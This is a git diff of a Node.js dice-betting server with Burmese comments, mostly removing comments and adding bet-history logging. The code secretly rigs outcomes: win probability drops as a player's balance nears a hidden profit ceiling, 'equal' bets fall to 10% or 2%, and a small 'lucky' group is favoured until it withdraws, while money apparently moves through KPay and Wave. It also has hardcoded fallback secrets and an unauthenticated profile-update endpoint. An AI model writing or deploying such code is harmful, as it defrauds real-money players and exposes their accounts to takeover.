@@ -17,11 +17,7 @@ const io = new Server(server, { cors: { origin: "*", methods: ["GET", "POST"] } 
 const JWT_SECRET = process.env.JWT_SECRET || 'dice_game_secret_key_123';
 const ADMIN_SECRET = process.env.ADMIN_SECRET || 'Lazysecurity';
 
-// ==========================================
-// ၁။ Database ချိတ်ဆက်ခြင်း & Schemas
-// ==========================================
-mongoose.connect(process.env.MONGO_URI)
-  .then(async () => {
+mongoose.connect(process.env.MONGO_URI).then(async () => {
     console.log('✅ MongoDB Connected!');
     const superAdminExists = await Admin.findOne({ role: 'superadmin' });
     if (!superAdminExists) {
@@ -30,7 +26,7 @@ mongoose.connect(process.env.MONGO_URI)
     }
     const settingsExist = await Settings.findOne();
     if (!settingsExist) await Settings.create({ kpay: '09450000000', wave: '09450000000', winRate: 42 }); 
-  }).catch(err => console.log('❌ DB Error:', err));
+}).catch(err => console.log('❌ DB Error:', err));
 
 const User = mongoose.model('User', new mongoose.Schema({ phone: { type: String, required: true, unique: true }, username: String, password: { type: String, required: true }, balance: { type: Number, default: 5000 } }));
 const BetHistory = mongoose.model('BetHistory', new mongoose.Schema({ phone: String, betType: String, amount: Number, result: String, payout: Number, createdAt: { type: Date, default: Date.now } }));
@@ -38,7 +34,6 @@ const Transaction = mongoose.model('Transaction', new mongoose.Schema({ phone: S
 const Admin = mongoose.model('Admin', new mongoose.Schema({ username: { type: String, required: true, unique: true }, password: { type: String, required: true }, role: { type: String, enum: ['superadmin', 'subadmin'], default: 'subadmin' } }));
 const Settings = mongoose.model('Settings', new mongoose.Schema({ kpay: { type: String, default: '09450000000' }, wave: { type: String, default: '09450000000' }, winRate: { type: Number, default: 42 } }));
 
-// 🚨 RAM တွင် သိမ်းထားသော User Balance ကို ဖျက်ပစ်ပြီး၊ Connection များကိုသာ မှတ်သားမည် 🚨
 let userPhones = {}; 
 let playerStats = {}; 
 const activeBets = new Set(); 
@@ -63,9 +58,6 @@ const getRiggedSinglePlayerDice = (betType, winProbability) => {
   return { dice1: d1, dice2: d2, total: targetTotal };
 };
 
-// ==========================================
-// ၃။ Socket Connection (Master AI Logic)
-// ==========================================
 io.on('connection', async (socket) => {
   const token = socket.handshake.query.token;
   if (!token) return socket.disconnect(); 
@@ -78,7 +70,6 @@ io.on('connection', async (socket) => {
     if (!dbUser) return socket.disconnect(); 
     
     userPhones[socket.id] = currentSocketPhone; 
-    // 🚨 ဝင်ဝင်ချင်း Database ပေါ်က အစစ်အမှန် Balance ကို တိုက်ရိုက် ပို့ပေးမည် 🚨
     socket.emit('balanceUpdate', dbUser.balance);
   } catch (err) { return socket.disconnect(); }
 
@@ -93,7 +84,6 @@ io.on('connection', async (socket) => {
       const betAmount = Number(data.amount);
       if (betAmount > 100000) return socket.emit('errorMsg', 'အများဆုံး ၁ သိန်းသာ လောင်းနိုင်ပါသည်!');
 
-      // 🚨 အမြဲတမ်း Database ထဲက အချိန်နဲ့တပြေးညီ Balance ကို ယူစစ်မည် 🚨
       let u = await User.findOne({ phone: activePhone });
 
       if (u && u.balance >= betAmount && betAmount > 0) {
@@ -102,7 +92,6 @@ io.on('connection', async (socket) => {
         
         let pStat = playerStats[activePhone];
         if (!pStat) { 
-          // 🚨 ၅% သော ကံထူးရှင်ကို စတင်ရွေးချယ်မည် 🚨
           pStat = { losses: 0, equalLosses: 0, pityTarget: getNewPityTarget(), equalPityTarget: getNewEqualPityTarget(), lastBet: betAmount, baseCapital: preBetBalance, isLucky: (Math.random() < 0.05) }; 
           playerStats[activePhone] = pStat; 
         }
@@ -117,44 +106,32 @@ io.on('connection', async (socket) => {
         const potentialWinAmount = Math.round(data.type === 'equal' ? betAmount * 5.8 : betAmount * 2.3);
         const futureBalance = u.balance + potentialWinAmount;
 
-        // 🚨 ၁။ မျက်နှာကြက် (Ceiling) တွက်ချက်ခြင်း 🚨
         let ceiling;
         if (pStat.isLucky) {
-          if (base <= 10000) ceiling = base * 10; // အသေးသမား: ၁၀ ဆ အထိ လွှတ်ပေးမည်
-          else if (base <= 50000) ceiling = base + 100000; // အလတ်သမား: အမြတ် ၁ သိန်း အထိ
-          else ceiling = base + 200000; // VIP သမား: အမြတ် ၂ သိန်း အထိ
+          if (base <= 10000) ceiling = base * 10; 
+          else if (base <= 50000) ceiling = base + 100000; 
+          else ceiling = base + 200000; 
         } else {
-          // ပုံမှန် ၉၅% ကစားသမား: အများဆုံး အမြတ် ၁ ဆ
           let allowedProfit = base < 50000 ? base : 50000; 
           ceiling = base + allowedProfit;
         }
 
         let probability = 0.42; 
 
-        // 🚨 ၂။ Rollercoaster Bleed Logic (Under / Over သမားများအတွက်သာ) 🚨
-        if (futureBalance >= ceiling) {
-          probability = 0.25; // မျက်နှာကြက်ကျော်ပါက အပြတ်ညှစ်မည် (၂၅%)
-        } else if (futureBalance >= ceiling * 0.8) {
-          probability = 0.35; // မျက်နှာကြက်နား ကပ်လာပါက ပြန်ဆွဲချမည် (၃၅%)
-        } else if (futureBalance >= base * 1.5) {
-          probability = 0.44; // အမြတ်စရနေချိန် တက်လိုက်ကျလိုက် ကစားမည် (၄၄%)
-        } else if (futureBalance >= base * 0.5) {
-          probability = 0.46; // အရင်းဝန်းကျင် - လှိုင်းစီးရန် တွန်းတင်ပေးမည် (၄၆%)
-        } else {
-          probability = 0.48; // ပြုတ်ခါနီး - အသက်ဆက်ပေးမည် (၄၈%)
-        }
+        if (futureBalance >= ceiling) probability = 0.25; 
+        else if (futureBalance >= ceiling * 0.8) probability = 0.35; 
+        else if (futureBalance >= base * 1.5) probability = 0.44; 
+        else if (futureBalance >= base * 0.5) probability = 0.46; 
+        else probability = 0.48; 
 
-        // 🚨 ၃။ EQUAL သမားများကို အသေသတ်ခြင်း 🚨
         if (data.type === 'equal') {
-          probability = 0.10; // Equal ၏ မူလနိုင်ခွင့်ကို ၁၀% ထိချထားမည်
-          if (futureBalance >= ceiling) probability = 0.02; // မျက်နှာကြက်ကျော်ပါက ၂% သို့ ထိုးချမည်
-          
+          probability = 0.10; 
+          if (futureBalance >= ceiling) probability = 0.02; 
           if (pStat.equalLosses >= pStat.equalPityTarget) { 
             probability = 1.0; 
-            if (futureBalance >= ceiling) probability = 0.15; // သနားစနစ်ဖြစ်နေရင်တောင် Limit ကျော်ရင် ၁၅% ပဲပေးမည်
+            if (futureBalance >= ceiling) probability = 0.15; 
           }
         } else {
-          // 🚨 Normal Pity System 🚨
           if (pStat.losses >= pStat.pityTarget) { 
             probability = 1.0; 
             if (futureBalance >= ceiling) probability = 0.25; 
@@ -176,7 +153,9 @@ io.on('connection', async (socket) => {
 
         await u.save();
         
-        // 🚨 Database သိမ်းပြီးတာနဲ့ ချက်ချင်း Socket မှတဆင့် တွန်းပို့ပေးမည် 🚨
+        // 🚨 ဤနေရာတွင် မှတ်တမ်း (BetHistory) အသစ် သိမ်းမည့် Code ပြန်ထည့်ထားပါသည် 🚨
+        await BetHistory.create({ phone: u.phone, betType: data.type, amount: betAmount, result: status, payout: winAmount });
+        
         socket.emit('soloResult', { dice: result, status, amountWon: winAmount, newBalance: u.balance });
         socket.emit('balanceUpdate', u.balance); 
         io.emit('userUpdate'); 
@@ -191,14 +170,10 @@ io.on('connection', async (socket) => {
   socket.on('disconnect', () => { delete userPhones[socket.id]; });
 });
 
-// ==========================================
-// ၄။ APIs
-// ==========================================
 app.post('/api/signup', async (req, res) => { const { phone, username, password } = req.body; try { const userExists = await User.findOne({ phone }); if (userExists) return res.status(400).json({ error: 'အကောင့်ရှိပြီးသားပါ' }); const hash = await bcrypt.hash(password, 10); const newUser = await User.create({ phone, username, password: hash, balance: 5000 }); const token = jwt.sign({ phone: newUser.phone, username: newUser.username }, JWT_SECRET); res.json({ message: 'Success', token, phone: newUser.phone, username: newUser.username, balance: newUser.balance }); } catch (e) { res.status(500).json({ error: 'Server error' }); }});
 app.post('/api/login', async (req, res) => { const { phone, password } = req.body; try { const user = await User.findOne({ phone }); if (!user) return res.status(400).json({ error: 'အချက်အလက် မှားယွင်းနေပါသည်' }); const isMatch = await bcrypt.compare(password, user.password); if (!isMatch) return res.status(400).json({ error: 'အချက်အလက် မှားယွင်းနေပါသည်' }); const token = jwt.sign({ phone: user.phone, username: user.username }, JWT_SECRET); res.json({ message: 'Success', token, phone: user.phone, username: user.username, balance: user.balance }); } catch (e) { res.status(500).json({ error: 'Server error' }); }});
 app.post('/api/profile/update', async (req, res) => { const { currentPhone, newPhone, newUsername } = req.body; try { if (currentPhone !== newPhone) { const phoneExists = await User.findOne({ phone: newPhone }); if (phoneExists) return res.status(400).json({ error: 'ဒီဖုန်းနံပါတ် သုံးပြီးပါပြီ' }); } const u = await User.findOneAndUpdate( { phone: currentPhone }, { phone: newPhone, username: newUsername }, { new: true } ); if (currentPhone !== newPhone) { await BetHistory.updateMany({ phone: currentPhone }, { phone: newPhone }); await Transaction.updateMany({ phone: currentPhone }, { phone: newPhone }); } res.json({ message: 'Success', phone: u.phone, username: u.username }); } catch (e) { res.status(500).json({ error: 'Server error' }); }});
 
-// 🚨 Deposit Amount ကို Number သေချာဖြစ်အောင် ပြင်ထားသည် 🚨
 app.post('/api/deposit', async (req, res) => { 
   try { 
     const amountNum = Number(req.body.amount);
@@ -228,7 +203,6 @@ app.post('/api/withdraw', async (req, res) => {
     u.balance -= Number(amount); 
     await u.save(); 
     
-    // 🚨 ငွေထုတ်ပြီးပါက Lucky Hero အခွင့်အရေး ဖျက်မည် 🚨
     if (playerStats[phone]) playerStats[phone].isLucky = undefined;
 
     const targetSocketId = Object.keys(userPhones).find(key => userPhones[key] === phone); 
@@ -272,7 +246,6 @@ app.get('/api/admin/transactions', verifyAdmin, async (req, res) => {
   } catch (e) { res.status(500).json({ error: 'Error' }); }
 });
 
-// 🚨 Admin မှ Approve လုပ်လျှင် Balance တိုက်ရိုက်တက်စေမည့် အပိုင်း 🚨
 app.post('/api/admin/transaction/action', verifyAdmin, async (req, res) => { 
   const { transactionId, action } = req.body; 
   try { 
@@ -308,7 +281,6 @@ app.post('/api/admin/settings', verifyAdmin, async (req, res) => { const { kpay,
 app.get('/api/admin/users', verifyAdmin, async (req, res) => { try { const allUsers = await User.find().select('-password').sort({ balance: -1 }); res.json(allUsers); } catch(e) { res.status(500).json({error: 'Error'}); }});
 app.delete('/api/admin/users/:id', verifyAdmin, async (req, res) => { try { await User.findByIdAndDelete(req.params.id); res.json({ message: 'အကောင့်ကို ဖျက်ပစ်လိုက်ပါပြီ' }); } catch(e) { res.status(500).json({error: 'Error'}); }});
 
-// 🚨 Admin Panel မှ Update Balance လုပ်လျှင် ချက်ချင်းတက်စေမည့် အပိုင်း 🚨
 app.post('/api/admin/users/update-balance', verifyAdmin, async (req, res) => { 
   const { phone, newBalance } = req.body; 
   try { 
